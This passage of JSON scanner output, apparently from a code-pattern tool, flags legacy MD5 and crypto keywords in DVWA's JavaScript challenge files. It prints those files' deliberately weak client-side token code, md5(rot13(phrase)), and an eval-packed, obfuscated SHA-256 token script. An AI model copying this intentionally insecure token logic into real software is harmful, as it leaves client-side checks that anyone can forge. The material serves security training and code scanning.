t?r?s(t,n):C(t,n):r?m(n):p(n)}&quot;function&quot;==typeof define&amp;&amp;define.amd?define(function(){return A}):&quot;object&quot;==typeof module&amp;&amp;module.exports?module.exports=A:n.md5=A}(this);\n\n\tfunction rot13(inp) {\n",
        "startLocationLine": 7,
        "startLocationColumn": 39,
        "endLocationLine": 7,
        "endLocationColumn": 42
      },
      {
        "Language": {
          "name": "php",
          "extensions": [
            ".php"
          ],
          "type": 0
        },
        "fileName": "/home/dev/tools/DVWA/vulnerabilities/javascript/source/low.php",
        "ruleId": "AI008800",
        "ruleName": "Cryptography: Hash Algorithm (Legacy)",
        "ruleDescription": "Cryptography: Hash Algorithm (Legacy)",
        "pattern": "\\b(MD2|MD4|MD5|SHA-*(0|1))\\b",
        "type": "Regex",
        "confidence": "High",
        "severity": "Moderate",
        "tags": [
          "Cryptography.HashAlgorithm.Legacy"
        ],
        "sample": "md5",
        "excerpt": "https://github.com/blueimp/JavaScript-MD5\n*/\n\n!function(n){&quot;use strict&quot;;function t(n,t){var r=(65535&amp;n)+(65535&amp;t);return(n&gt;&gt;16)+(t&gt;&gt;16)+(r&gt;&gt;16)&lt;&lt;16|65535&amp;r}function r(n,t){return n&lt;&lt;t|n&gt;&gt;&gt;32-t}function e(n,e,o,u,c,f){return t(r(t(t(e,n),t(u,f)),c),o)}function o(n,t,r,o,u,c,f){return e(t&amp;r|~t&amp;o,n,t,u,c,f)}function u(n,t,r,o,u,c,f){return e(t&amp;o|r&amp;~o,n,t,u,c,f)}function c(n,t,r,o,u,c,f){return e(t^r^o,n,t,u,c,f)}function f(n,t,r,o,u,c,f){return e(r^(t|~o),n,t,u,c,f)}function i(n,r){n[r&gt;&gt;5]|=128&lt;&lt;r%32,n[14+(r+64&gt;&gt;&gt;9&lt;&lt;4)]=r;var e,i,a,d,h,l=1732584193,g=-271733879,v=-1732584194,m=271733878;for(e=0;e&lt;n.length;e+=16)i=l,a=g,d=v,h=m,g=f(g=f(g=f(g=f(g=c(g=c(g=c(g=c(g=u(g=u(g=u(g=u(g=o(g=o(g=o(g=o(g,v=o(v,m=o(m,l=o(l,g,v,m,n[e],7,-680876936),g,v,n[e+1],12,-389564586),l,g,n[e+2],17,606105819),m,l,n[e+3],22,-1044525330),v=o(v,m=o(m,l=o(l,g,v,m,n[e+4],7,-176418897),g,v,n[e+5],12,1200080426),l,g,n[e+6],17,-1473231341),m,l,n[e+7],22,-45705983),v=o(v,m=o(m,l=o(l,g,v,m,n[e+8],7,1770035416),g,v,n[e+9],12,-1958414417),l,g,n[e+10],17,-42063),m,l,n[e+11],22,-1990404162),v=o(v,m=o(m,l=o(l,g,v,m,n[e+12],7,1804603682),g,v,n[e+13],12,-40341101),l,g,n[e+14],17,-1502002290),m,l,n[e+15],22,1236535329),v=u(v,m=u(m,l=u(l,g,v,m,n[e+1],5,-165796510),g,v,n[e+6],9,-1069501632),l,g,n[e+11],14,643717713),m,l,n[e],20,-373897302),v=u(v,m=u(m,l=u(l,g,v,m,n[e+5],5,-701558691),g,v,n[e+10],9,38016083),l,g,n[e+15],14,-660478335),m,l,n[e+4],20,-405537848),v=u(v,m=u(m,l=u(l,g,v,m,n[e+9],5,568446438),g,v,n[e+14],9,-1019803690),l,g,n[e+3],14,-187363961),m,l,n[e+8],20,1163531501),v=u(v,m=u(m,l=u(l,g,v,m,n[e+13],5,-1444681467),g,v,n[e+2],9,-51403784),l,g,n[e+7],14,1735328473),m,l,n[e+12],20,-1926607734),v=c(v,m=c(m,l=c(l,g,v,m,n[e+5],4,-378558),g,v,n[e+8],11,-2022574463),l,g,n[e+11],16,1839030562),m,l,n[e+14],23,-35309556),v=c(v,m=c(m,l=c(l,g,v,m,n[e+1],4,-1530992060),g,v,n[e+4],11,1272893353),l,g,n[e+7],16,-155497632),m,l,n[e+10],23,-1094730640),v=c(v,m=c(m,l=c(l,g,v,m,n[e+13],4,681279174),g,v,n[e],11,-358537222),l,g,n[e+3],16,-722521979),m,l,n[e+6],23,76029189),v=c(v,m=c(m,l=c(l,g,v,m,n[e+9],4,-640364487),g,v,n[e+12],11,-421815835),l,g,n[e+15],16,530742520),m,l,n[e+2],23,-995338651),v=f(v,m=f(m,l=f(l,g,v,m,n[e],6,-198630844),g,v,n[e+7],10,1126891415),l,g,n[e+14],15,-1416354905),m,l,n[e+5],21,-57434055),v=f(v,m=f(m,l=f(l,g,v,m,n[e+12],6,1700485571),g,v,n[e+3],10,-1894986606),l,g,n[e+10],15,-1051523),m,l,n[e+1],21,-2054922799),v=f(v,m=f(m,l=f(l,g,v,m,n[e+8],6,1873313359),g,v,n[e+15],10,-30611744),l,g,n[e+6],15,-1560198380),m,l,n[e+13],21,1309151649),v=f(v,m=f(m,l=f(l,g,v,m,n[e+4],6,-145523070),g,v,n[e+11],10,-1120210379),l,g,n[e+2],15,718787259),m,l,n[e+9],21,-343485551),l=t(l,i),g=t(g,a),v=t(v,d),m=t(m,h);return[l,g,v,m]}function a(n){var t,r=&quot;&quot;,e=32*n.length;for(t=0;t&lt;e;t+=8)r+=String.fromCharCode(n[t&gt;&gt;5]&gt;&gt;&gt;t%32&amp;255);return r}function d(n){var t,r=[];for(r[(n.length&gt;&gt;2)-1]=void 0,t=0;t&lt;r.length;t+=1)r[t]=0;var e=8*n.length;for(t=0;t&lt;e;t+=8)r[t&gt;&gt;5]|=(255&amp;n.charCodeAt(t/8))&lt;&lt;t%32;return r}function h(n){return a(i(d(n),8*n.length))}function l(n,t){var r,e,o=d(n),u=[],c=[];for(u[15]=c[15]=void 0,o.length&gt;16&amp;&amp;(o=i(o,8*n.length)),r=0;r&lt;16;r+=1)u[r]=909522486^o[r],c[r]=1549556828^o[r];return e=i(u.concat(d(t)),512+8*t.length),a(i(c.concat(e),640))}function g(n){var t,r,e=&quot;&quot;;for(r=0;r&lt;n.length;r+=1)t=n.charCodeAt(r),e+=&quot;0123456789abcdef&quot;.charAt(t&gt;&gt;&gt;4&amp;15)+&quot;0123456789abcdef&quot;.charAt(15&amp;t);return e}function v(n){return unescape(encodeURIComponent(n))}function m(n){return h(v(n))}function p(n){return g(m(n))}function s(n,t){return l(v(n),v(t))}function C(n,t){return g(s(n,t))}function A(n,t,r){return t?r?s(t,n):C(t,n):r?m(n):p(n)}&quot;function&quot;==typeof define&amp;&amp;define.amd?define(function(){return A}):&quot;object&quot;==typeof module&amp;&amp;module.exports?module.exports=A:n.md5=A}(this);\n\n\tfunction rot13(inp) {\n\t\treturn inp.replace(/[a-zA-Z]/g,function(c){return String.fromCharCode((c&lt;=&quot;Z&quot;?90:122)&gt;=(c=c.charCodeAt(0)+13)?c:c-26);});\n\t}\n\n",
        "startLocationLine": 10,
        "startLocationColumn": 3718,
        "endLocationLine": 10,
        "endLocationColumn": 3721
      },
      {
        "Language": {
          "name": "php",
          "extensions": [
            ".php"
          ],
          "type": 0
        },
        "fileName": "/home/dev/tools/DVWA/vulnerabilities/javascript/source/low.php",
        "ruleId": "AI008800",
        "ruleName": "Cryptography: Hash Algorithm (Legacy)",
        "ruleDescription": "Cryptography: Hash Algorithm (Legacy)",
        "pattern": "\\b(MD2|MD4|MD5|SHA-*(0|1))\\b",
        "type": "Regex",
        "confidence": "High",
        "severity": "Moderate",
        "tags": [
          "Cryptography.HashAlgorithm.Legacy"
        ],
        "sample": "md5",
        "excerpt": "\n\tfunction generate_token() {\n\t\tvar phrase = document.getElementById(&quot;phrase&quot;).value;\n\t\tdocument.getElementById(&quot;token&quot;).value = md5(rot13(phrase));\n\t}\n\n\tgenerate_token();\n&lt;/script&gt;\nEOF;\n",
        "startLocationLine": 18,
        "startLocationColumn": 44,
        "endLocationLine": 18,
        "endLocationColumn": 47
      },
      {
        "Language": {
          "name": "javascript",
          "extensions": [
            ".js"
          ],
          "type": 0
        },
        "fileName": "/home/dev/tools/DVWA/vulnerabilities/javascript/source/high.js",
        "ruleId": "AI007600",
        "ruleName": "Cryptography: Encryption (General)",
        "ruleDescription": "Cryptography: Encryption",
        "pattern": "encrypt|decrypt|cipher|crypt|symmmetric",
        "type": "Regex",
        "confidence": "High",
        "severity": "Moderate",
        "tags": [
          "Cryptography.Encryption.General"
        ],
        "sample": "crypt",
        "excerpt": "var a=[&#39;fromCharCode&#39;,&#39;toString&#39;,&#39;replace&#39;,&#39;BeJ&#39;,&#39;\\x5cw+&#39;,&#39;Lyg&#39;,&#39;SuR&#39;,&#39;(w(){\\x273M\\x203L\\x27;q\\x201l=\\x273K\\x203I\\x203J\\x20T\\x27;q\\x201R=1c\\x202I===\\x271n\\x27;q\\x20Y=1R?2I:{};p(Y.3N){1R=1O}q\\x202L=!1R&amp;&amp;1c\\x202M===\\x271n\\x27;q\\x202o=!Y.2S&amp;&amp;1c\\x202d===\\x271n\\x27&amp;&amp;2d.2Q&amp;&amp;2d.2Q.3S;p(2o){Y=3R}z\\x20p(2L){Y=2M}q\\x202G=!Y.3Q&amp;&amp;1c\\x202g===\\x271n\\x27&amp;&amp;2g.X;q\\x202s=1c\\x202l===\\x27w\\x27&amp;&amp;2l.3P;q\\x201y=!Y.3H&amp;&amp;1c\\x20Z!==\\x272T\\x27;q\\x20m=\\x273G\\x27.3z(\\x27\\x27);q\\x202w=[-3y,3x,3v,3w];q\\x20U=[24,16,8,0];q\\x20K=[3A,3B,3F,3E,3D,3C,3T,3U,4d,4c,4b,49,4a,4e,4f,4j,4i,4h,3u,48,47,3Z,3Y,3X,3V,3W,40,41,46,45,43,42,4k,3f,38,36,39,37,34,33,2Y,31,2Z,35,3t,3n,3m,3l,3o,3p,3s,3r,3q,3k,3j,3d,3a,3c,3b,3e,3h,3g,3i,4g];q\\x201E=[\\x271e\\x27,\\x2727\\x27,\\x271G\\x27,\\x272R\\x27];q\\x20l=[];p(Y.2S||!1z.1K){1z.1K=w(1x){A\\x204C.Q.2U.1I(1x)===\\x27[1n\\x201z]\\x27}}p(1y&amp;&amp;(Y.50||!Z.1N)){Z.1N=w(1x){A\\x201c\\x201x===\\x271n\\x27&amp;&amp;1x.1w&amp;&amp;1x.1w.1J===Z}}q\\x202m=w(1X,x){A\\x20w(s){A\\x20O\\x20N(x,1d).S(s)[1X]()}};q\\x202a=w(x){q\\x20P=2m(\\x271e\\x27,x);p(2o){P=2P(P,x)}P.1T=w(){A\\x20O\\x20N(x)};P.S=w(s){A\\x20P.1T().S(s)};1g(q\\x20i=0;i&lt;1E.W;++i){q\\x20T=1E[i];P[T]=2m(T,x)}A\\x20P};q\\x202P=w(P,x){q\\x201S=2O(\\x222N(\\x271S\\x27)\\x22);q\\x201Y=2O(\\x222N(\\x271w\\x27).1Y\\x22);q\\x202n=x?\\x271H\\x27:\\x271q\\x27;q\\x202z=w(s){p(1c\\x20s===\\x272p\\x27){A\\x201S.2x(2n).S(s,\\x274S\\x27).1G(\\x271e\\x27)}z{p(s===2q||s===2T){1u\\x20O\\x201t(1l)}z\\x20p(s.1J===Z){s=O\\x202r(s)}}p(1z.1K(s)||Z.1N(s)||s.1J===1Y){A\\x201S.2x(2n).S(O\\x201Y(s)).1G(\\x271e\\x27)}z{A\\x20P(s)}};A\\x202z};q\\x202k=w(1X,x){A\\x20w(G,s){A\\x20O\\x201P(G,x,1d).S(s)[1X]()}};q\\x202f=w(x){q\\x20P=2k(\\x271e\\x27,x);P.1T=w(G){A\\x20O\\x201P(G,x)};P.S=w(G,s){A\\x20P.1T(G).S(s)};1g(q\\x20i=0;i&lt;1E.W;++i){q\\x20T=1E[i];P[T]=2k(T,x)}A\\x20P};w\\x20N(x,1v){p(1v){l[0]=l[16]=l[1]=l[2]=l[3]=l[4]=l[5]=l[6]=l[7]=l[8]=l[9]=l[10]=l[11]=l[12]=l[13]=l[14]=l[15]=0;k.l=l}z{k.l=[0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0]}p(x){k.C=4I;k.B=4H;k.E=4l;k.F=4U;k.J=4J;k.I=4K;k.H=4L;k.D=4T}z{k.C=4X;k.B=4W;k.E=4Y;k.F=4Z;k.J=4V;k.I=4O;k.H=4F;k.D=4s}k.1C=k.1A=k.L=k.2i=0;k.1U=k.1L=1O;k.2j=1d;k.x=x}N.Q.S=w(s){p(k.1U){A}q\\x202h,T=1c\\x20s;p(T!==\\x272p\\x27){p(T===\\x271n\\x27){p(s===2q){1u\\x20O\\x201t(1l)}z\\x20p(1y&amp;&amp;s.1J===Z){s=O\\x202r(s)}z\\x20p(!1z.1K(s)){p(!1y||!Z.1N(s)){1u\\x20O\\x201t(1l)}}}z{1u\\x20O\\x201t(1l)}2h=1d}q\\x20r,M=0,i,W=s.W,l=k.l;4t(M&lt;W){p(k.1L){k.1L=1O;l[0]=k.1C;l[16]=l[1]=l[2]=l[3]=l[4]=l[5]=l[6]=l[7]=l[8]=l[9]=l[10]=l[11]=l[12]=l[13]=l[14]=l[15]=0}p(2h){1g(i=k.1A;M&lt;W&amp;&amp;i&lt;1k;++M){l[i&gt;&gt;2]|=s[M]&lt;&lt;U[i++&amp;3]}}z{1g(i=k.1A;M&lt;W&amp;&amp;i&lt;1k;++M){r=s.1Q(M);p(r&lt;R){l[i&gt;&gt;2]|=r&lt;&lt;U[i++&amp;3]}z\\x20p(r&lt;2v){l[i&gt;&gt;2]|=(2t|(r&gt;&gt;6))&lt;&lt;U[i++&amp;3];l[i&gt;&gt;2]|=(R|(r&amp;V))&lt;&lt;U[i++&amp;3]}z\\x20p(r&lt;2A||r&gt;=2E){l[i&gt;&gt;2]|=(2D|(r&gt;&gt;12))&lt;&lt;U[i++&amp;3];l[i&gt;&gt;2]|=(R|((r&gt;&gt;6)&amp;V))&lt;&lt;U[i++&amp;3];l[i&gt;&gt;2]|=(R|(r&amp;V))&lt;&lt;U[i++&amp;3]}z{r=2C+(((r&amp;23)&lt;&lt;10)|(s.1Q(++M)&amp;23));l[i&gt;&gt;2]|=(2X|(r&gt;&gt;18))&lt;&lt;U[i++&amp;3];l[i&gt;&gt;2]|=(R|((r&gt;&gt;12)&amp;V))&lt;&lt;U[i++&amp;3];l[i&gt;&gt;2]|=(R|((r&gt;&gt;6)&amp;V))&lt;&lt;U[i++&amp;3];l[i&gt;&gt;2]|=(R|(r&amp;V))&lt;&lt;U[i++&amp;3]}}}k.2u=i;k.L+=i-k.1A;p(i&gt;=1k){k.1C=l[16];k.1A=i-1k;k.1W();k.1L=1d}z{k.1A=i}}p(k.L&gt;4r){k.2i+=k.L/2H&lt;&lt;0;k.L=k.L%2H}A\\x20k};N.Q.1s=w(){p(k.1U){A}k.1U=1d;q\\x20l=k.l,i=k.2u;l[16]=k.1C;l[i&gt;&gt;2]|=2w[i&amp;3];k.1C=l[16];p(i&gt;=4q){p(!k.1L){k.1W()}l[0]=k.1C;l[16]=l[1]=l[2]=l[3]=l[4]=l[5]=l[6]=l[7]=l[8]=l[9]=l[10]=l[11]=l[12]=l[13]=l[14]=l[15]=0}l[14]=k.2i&lt;&lt;3|k.L&gt;&gt;&gt;29;l[15]=k.L&lt;&lt;3;k.1W()};N.Q.1W=w(){q\\x20a=k.C,b=k.B,c=k.E,d=k.F,e=k.J,f=k.I,g=k.H,h=k.D,l=k.l,j,1a,1b,1j,v,1f,1h,1B,1Z,1V,1D;1g(j=16;j&lt;1k;++j){v=l[j-15];1a=((v&gt;&gt;&gt;7)|(v&lt;&lt;25))^((v&gt;&gt;&gt;18)|(v&lt;&lt;14))^(v&gt;&gt;&gt;3);v=l[j-2];1b=((v&gt;&gt;&gt;17)|(v&lt;&lt;15))^((v&gt;&gt;&gt;19)|(v&lt;&lt;13))^(v&gt;&gt;&gt;10);l[j]=l[j-16]+1a+l[j-7]+1b&lt;&lt;0}1D=b&amp;c;1g(j=0;j&lt;1k;j+=4){p(k.2j){p(k.x){1B=4m;v=l[0]-4n;h=v-4o&lt;&lt;0;d=v+4p&lt;&lt;0}z{1B=4v;v=l[0]-4w;h=v-4G&lt;&lt;0;d=v+4D&lt;&lt;0}k.2j=1O}z{1a=((a&gt;&gt;&gt;2)|(a&lt;&lt;30))^((a&gt;&gt;&gt;13)|(a&lt;&lt;19))^((a&gt;&gt;&gt;22)|(a&lt;&lt;10));1b=((e&gt;&gt;&gt;6)|(e&lt;&lt;26))^((e&gt;&gt;&gt;11)|(e&lt;&lt;21))^((e&gt;&gt;&gt;25)|(e&lt;&lt;7));1B=a&amp;b;1j=1B^(a&amp;c)^1D;1h=(e&amp;f)^(~e&amp;g);v=h+1b+1h+K[j]+l[j];1f=1a+1j;h=d+v&lt;&lt;0;d=v+1f&lt;&lt;0}1a=((d&gt;&gt;&gt;2)|(d&lt;&lt;30))^((d&gt;&gt;&gt;13)|(d&lt;&lt;19))^((d&gt;&gt;&gt;22)|(d&lt;&lt;10));1b=((h&gt;&gt;&gt;6)|(h&lt;&lt;26))^((h&gt;&gt;&gt;11)|(h&lt;&lt;21))^((h&gt;&gt;&gt;25)|(h&lt;&lt;7));1Z=d&amp;a;1j=1Z^(d&amp;b)^1B;1h=(h&amp;e)^(~h&amp;f);v=g+1b+1h+K[j+1]+l[j+1];1f=1a+1j;g=c+v&lt;&lt;0;c=v+1f&lt;&lt;0;1a=((c&gt;&gt;&gt;2)|(c&lt;&lt;30))^((c&gt;&gt;&gt;13)|(c&lt;&lt;19))^((c&gt;&gt;&gt;22)|(c&lt;&lt;10));1b=((g&gt;&gt;&gt;6)|(g&lt;&lt;26))^((g&gt;&gt;&gt;11)|(g&lt;&lt;21))^((g&gt;&gt;&gt;25)|(g&lt;&lt;7));1V=c&amp;d;1j=1V^(c&amp;a)^1Z;1h=(g&amp;h)^(~g&amp;e);v=f+1b+1h+K[j+2]+l[j+2];1f=1a+1j;f=b+v&lt;&lt;0;b=v+1f&lt;&lt;0;1a=((b&gt;&gt;&gt;2)|(b&lt;&lt;30))^((b&gt;&gt;&gt;13)|(b&lt;&lt;19))^((b&gt;&gt;&gt;22)|(b&lt;&lt;10));1b=((f&gt;&gt;&gt;6)|(f&lt;&lt;26))^((f&gt;&gt;&gt;11)|(f&lt;&lt;21))^((f&gt;&gt;&gt;25)|(f&lt;&lt;7));1D=b&amp;c;1j=1D^(b&amp;d)^1V;1h=(f&amp;g)^(~f&amp;h);v=e+1b+1h+K[j+3]+l[j+3];1f=1a+1j;e=a+v&lt;&lt;0;a=v+1f&lt;&lt;0}k.C=k.C+a&lt;&lt;0;k.B=k.B+b&lt;&lt;0;k.E=k.E+c&lt;&lt;0;k.F=k.F+d&lt;&lt;0;k.J=k.J+e&lt;&lt;0;k.I=k.I+f&lt;&lt;0;k.H=k.H+g&lt;&lt;0;k.D=k.D+h&lt;&lt;0};N.Q.1e=w(){k.1s();q\\x20C=k.C,B=k.B,E=k.E,F=k.F,J=k.J,I=k.I,H=k.H,D=k.D;q\\x201e=m[(C&gt;&gt;28)&amp;o]+m[(C&gt;&gt;24)&amp;o]+m[(C&gt;&gt;20)&amp;o]+m[(C&gt;&gt;16)&amp;o]+m[(C&gt;&gt;12)&amp;o]+m[(C&gt;&gt;8)&amp;o]+m[(C&gt;&gt;4)&amp;o]+m[C&amp;o]+m[(B&gt;&gt;28)&amp;o]+m[(B&gt;&gt;24)&amp;o]+m[(B&gt;&gt;20)&amp;o]+m[(B&gt;&gt;16)&amp;o]+m[(B&gt;&gt;12)&amp;o]+m[(B&gt;&gt;8)&amp;o]+m[(B&gt;&gt;4)&amp;o]+m[B&amp;o]+m[(E&gt;&gt;28)&amp;o]+m[(E&gt;&gt;24)&amp;o]+m[(E&gt;&gt;20)&amp;o]+m[(E&gt;&gt;16)&amp;o]+m[(E&gt;&gt;12)&amp;o]+m[(E&gt;&gt;8)&amp;o]+m[(E&gt;&gt;4)&amp;o]+m[E&amp;o]+m[(F&gt;&gt;28)&amp;o]+m[(F&gt;&gt;24)&amp;o]+m[(F&gt;&gt;20)&amp;o]+m[(F&gt;&gt;16)&amp;o]+m[(F&gt;&gt;12)&amp;o]+m[(F&gt;&gt;8)&amp;o]+m[(F&gt;&gt;4)&amp;o]+m[F&amp;o]+m[(J&gt;&gt;28)&amp;o]+m[(J&gt;&gt;24)&amp;o]+m[(J&gt;&gt;20)&amp;o]+m[(J&gt;&gt;16)&amp;o]+m[(J&gt;&gt;12)&amp;o]+m[(J&gt;&gt;8)&amp;o]+m[(J&gt;&gt;4)&amp;o]+m[J&amp;o]+m[(I&gt;&gt;28)&amp;o]+m[(I&gt;&gt;24)&amp;o]+m[(I&gt;&gt;20)&amp;o]+m[(I&gt;&gt;16)&amp;o]+m[(I&gt;&gt;12)&amp;o]+m[(I&gt;&gt;8)&amp;o]+m[(I&gt;&gt;4)&amp;o]+m[I&amp;o]+m[(H&gt;&gt;28)&amp;o]+m[(H&gt;&gt;24)&amp;o]+m[(H&gt;&gt;20)&amp;o]+m[(H&gt;&gt;16)&amp;o]+m[(H&gt;&gt;12)&amp;o]+m[(H&gt;&gt;8)&amp;o]+m[(H&gt;&gt;4)&amp;o]+m[H&amp;o];p(!k.x){1e+=m[(D&gt;&gt;28)&amp;o]+m[(D&gt;&gt;24)&amp;o]+m[(D&gt;&gt;20)&amp;o]+m[(D&gt;&gt;16)&amp;o]+m[(D&gt;&gt;12)&amp;o]+m[(D&gt;&gt;8)&amp;o]+m[(D&gt;&gt;4)&amp;o]+m[D&amp;o]}A\\x201e};N.Q.2U=N.Q.1e;N.Q.1G=w(){k.1s();q\\x20C=k.C,B=k.B,E=k.E,F=k.F,J=k.J,I=k.I,H=k.H,D=k.D;q\\x202b=[(C&gt;&gt;24)&amp;u,(C&gt;&gt;16)&amp;u,(C&gt;&gt;8)&amp;u,C&amp;u,(B&gt;&gt;24)&amp;u,(B&gt;&gt;16)&amp;u,(B&gt;&gt;8)&amp;u,B&amp;u,(E&gt;&gt;24)&amp;u,(E&gt;&gt;16)&amp;u,(E&gt;&gt;8)&amp;u,E&amp;u,(F&gt;&gt;24)&amp;u,(F&gt;&gt;16)&amp;u,(F&gt;&gt;8)&amp;u,F&amp;u,(J&gt;&gt;24)&amp;u,(J&gt;&gt;16)&amp;u,(J&gt;&gt;8)&amp;u,J&amp;u,(I&gt;&gt;24)&amp;u,(I&gt;&gt;16)&amp;u,(I&gt;&gt;8)&amp;u,I&amp;u,(H&gt;&gt;24)&amp;u,(H&gt;&gt;16)&amp;u,(H&gt;&gt;8)&amp;u,H&amp;u];p(!k.x){2b.4A((D&gt;&gt;24)&amp;u,(D&gt;&gt;16)&amp;u,(D&gt;&gt;8)&amp;u,D&amp;u)}A\\x202b};N.Q.27=N.Q.1G;N.Q.2R=w(){k.1s();q\\x201w=O\\x20Z(k.x?28:32);q\\x201i=O\\x204x(1w);1i.1p(0,k.C);1i.1p(4,k.B);1i.1p(8,k.E);1i.1p(12,k.F);1i.1p(16,k.J);1i.1p(20,k.I);1i.1p(24,k.H);p(!k.x){1i.1p(28,k.D)}A\\x201w};w\\x201P(G,x,1v){q\\x20i,T=1c\\x20G;p(T===\\x272p\\x27){q\\x20L=[],W=G.W,M=0,r;1g(i=0;i&lt;W;++i){r=G.1Q(i);p(r&lt;R){L[M++]=r}z\\x20p(r&lt;2v){L[M++]=(2t|(r&gt;&gt;6));L[M++]=(R|(r&amp;V))}z\\x20p(r&lt;2A||r&gt;=2E){L[M++]=(2D|(r&gt;&gt;12));L[M++]=(R|((r&gt;&gt;6)&amp;V));L[M++]=(R|(r&amp;V))}z{r=2C+(((r&amp;23)&lt;&lt;10)|(G.1Q(++i)&amp;23));L[M++]=(2X|(r&gt;&gt;18));L[M++]=(R|((r&gt;&gt;12)&amp;V));L[M++]=(R|((r&gt;&gt;6)&amp;V));L[M++]=(R|(r&amp;V))}}G=L}z{p(T===\\x271n\\x27){p(G===2q){1u\\x20O\\x201t(1l)}z\\x20p(1y&amp;&amp;G.1J===Z){G=O\\x202r(G)}z\\x20p(!1z.1K(G)){p(!1y||!Z.1N(G)){1u\\x20O\\x201t(1l)}}}z{1u\\x20O\\x201t(1l)}}p(G.W&gt;1k){G=(O\\x20N(x,1d)).S(G).27()}q\\x201F=[],2e=[];1g(i=0;i&lt;1k;++i){q\\x20b=G[i]||0;1F[i]=4z^b;2e[i]=4y^b}N.1I(k,x,1v);k.S(2e);k.1F=1F;k.2c=1d;k.1v=1v}1P.Q=O\\x20N();1P.Q.1s=w(){N.Q.1s.1I(k);p(k.2c){k.2c=1O;q\\x202W=k.27();N.1I(k,k.x,k.1v);k.S(k.1F);k.S(2W);N.Q.1s.1I(k)}};q\\x20X=2a();X.1q=X;X.1H=2a(1d);X.1q.2V=2f();X.1H.2V=2f(1d);p(2G){2g.X=X}z{Y.1q=X.1q;Y.1H=X.1H;p(2s){2l(w(){A\\x20X})}}})();w\\x202y(e){1g(q\\x20t=\\x22\\x22,n=e.W-1;n&gt;=0;n--)t+=e[n];A\\x20t}w\\x202J(t,y=\\x224B\\x22){1m.1o(\\x221M\\x22).1r=1q(1m.1o(\\x221M\\x22).1r+y)}w\\x202B(e=\\x224E\\x22){1m.1o(\\x221M\\x22).1r=1q(e+1m.1o(\\x221M\\x22).1r)}w\\x202K(a,b){1m.1o(\\x221M\\x22).1r=2y(1m.1o(\\x222F\\x22).1r)}1m.1o(\\x222F\\x22).1r=\\x22\\x22;4u(w(){2B(\\x224M\\x22)},4N);1m.1o(\\x224P\\x22).4Q(\\x224R\\x22,2J);2K(\\x223O\\x22,44);&#39;,&#39;||||||||||||||||||||this|blocks|HEX_CHARS||0x0F|if|var|code|message||0xFF|t1|function|is224||else|return|h1|h0|h7|h2|h3|key|h6|h5|h4||bytes|index|Sha256|new|method|prototype|0x80|update|type|SHIFT|0x3f|length|exports|root|ArrayBuffer|||||||||||s0|s1|typeof|true|hex|t2|for|ch|dataView|maj|64|ERROR|document|object|getElementById|setUint32|sha256|value|finalize|Error|throw|sharedMemory|buffer|obj|ARRAY_BUFFER|Array|start|ab|block|bc|OUTPUT_TYPES|oKeyPad|digest|sha224|call|constructor|isArray|hashed|token|isView|false|HmacSha256|charCodeAt|WINDOW|crypto|create|finalized|cd|hash|outputType|Buffer|da||||0x3ff||||array|||createMethod|arr|inner|process|iKeyPad|createHmacMethod|module|notString|hBytes|first|createHmacOutputMethod|define|createOutputMethod|algorithm|NODE_JS|string|null|Uint8Array|AMD|0xc0|lastByteIndex|0x800|EXTRA|createHash|do_something|nodeMethod|0xd800|token_part_2|0x10000|0xe0|0xe000|phrase|COMMON_JS|4294967296|window|token_part_3|token_part_1|WEB_WORKER|self|require|eval|nodeWrap|versions|arrayBuffer|JS_SHA256_NO_NODE_JS|undefined|toString|hmac|innerHash|0xf0|0xa2bfe8a1|0xc24b8b70||0xa81a664b||0x92722c85|0x81c2c92e|0xc76c51a3|0x53380d13|0x766a0abb|0x4d2c6dfc|0x650a7354|0x748f82ee|0x84c87814|0x78a5636f|0x682e6ff3|0x8cc70208|0x2e1b2138|0xa4506ceb|0x90befffa|0xbef9a3f7|0x5b9cca4f|0x4ed8aa4a|0x106aa070|0xf40e3585|0xd6990624|0x19a4c116|0x1e376c08|0x391c0cb3|0x34b0bcb5|0x2748774c|0xd192e819|0x0fc19dc6|32768|128|8388608|2147483648|split|0x428a2f98|0x71374491|0x59f111f1|0x3956c25b|0xe9b5dba5|0xb5c0fbcf|0123456789abcdef|JS_SHA256_NO_ARRAY_BUFFER|is|invalid|input|strict|use|JS_SHA256_NO_WINDOW|ABCD|amd|JS_SHA256_NO_COMMON_JS|global|node|0x923f82a4|0xab1c5ed5|0x983e5152|0xa831c66d|0x76f988da|0x5cb0a9dc|0x4a7484aa|0xb00327c8|0xbf597fc7|0x14292967|0x06ca6351||0xd5a79147|0xc6e00bf3|0x2de92c6f|0x240ca1cc|0x550c7dc3|0x72be5d74|0x243185be|0x12835b01|0xd807aa98|0x80deb1fe|0x9bdc06a7|0xc67178f2|0xefbe4786|0xe49b69c1|0xc19bf174|0x27b70a85|0x3070dd17|300032|1413257819|150054599|24177077|56|4294967295|0x5be0cd19|while|setTimeout|704751109|210244248|DataView|0x36|0x5c|push|ZZ|Object|143694565|YY|0x1f83d9ab|1521486534|0x367cd507|0xc1059ed8|0xffc00b31|0x68581511|0x64f98fa7|XX|300|0x9b05688c|send|addEventListener|click|utf8|0xbefa4fa4|0xf70e5939|0x510e527f|0xbb67ae85|0x6a09e667|0x3c6ef372|0xa54ff53a|JS_SHA256_NO_ARRAY_BUFFER_IS_VIEW&#39;,&#39;split&#39;];(function(c,d){var e=function(f){while(--f){c[&#39;push&#39;](c[&#39;shift&#39;]());}};e(++d);}(a,0x1f4));var b=function(c,d){c=c-0x0;var e=a[c];return e;};eval(function(d,e,f,g,h,i){h=function(j){return(j&lt;e?&#39;&#39;:h(parseInt(j/e)))+((j=j%e)&gt;0x23?String[b(&#39;0x0&#39;)](j+0x1d):j[b(&#39;0x1&#39;)](0x24));};if(!&#39;&#39;[b(&#39;0x2&#39;)](/^/,String)){while(f--){i[h(f)]=g[f]||h(f);}g=[function(k){if(&#39;wpA&#39;!==b(&#39;0x3&#39;)){return i[k];}else{while(f--){i[k(f)]=g[f]||k(f);}g=[function(l){return i[l];}];k=function(){return b(&#39;0x4&#39;);};f=0x1;}}];h=function(){return b(&#39;0x4&#39;);};f=0x1;};while(f--){if(g[f]){if(b(&#39;0x5&#39;)===b(&#39;0x6&#39;)){return i[h];}else{d=d[b(&#39;0x2&#39;)](new RegExp(&#39;\\x5cb&#39;+h(f)+&#39;\\x5cb&#39;,&#39;g&#39;),g[f]);}}}return d;}(b(&#39;0x7&#39;),0x3e,0x137,b(&#39;0x8&#39;)[b(&#39;0x9&#39;)](&#39;|&#39;),0x0,{}));\n\n",
        "startLocationLine": 1,
        "startLocationColumn": 7880,
        "endLocationLine": 1,
        "endLocationColumn": 7885
      },
      {
        "Language": {
          "name": "javascript",
          "extensions": [
